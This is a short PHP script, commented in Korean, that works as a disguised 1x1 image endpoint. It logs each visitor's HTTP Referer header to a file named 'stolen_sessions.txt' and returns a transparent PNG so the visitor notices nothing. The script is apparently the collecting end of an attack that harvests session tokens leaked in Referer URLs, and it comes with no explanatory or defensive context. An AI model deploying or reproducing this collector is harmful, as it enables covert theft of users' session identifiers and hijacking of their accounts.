<?php
// Referer 헤더 수집
$referer = $_SERVER['HTTP_REFERER'] ?? '없음';

// 로그 파일에 저장
file_put_contents("stolen_sessions.txt", $referer . PHP_EOL, FILE_APPEND);

// 사용자 눈에는 그냥 이미지로 보이도록 1x1 PNG 응답
header("Content-Type: image/png");
echo base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAnsB9TYqzqgAAAAASUVORK5CYII=");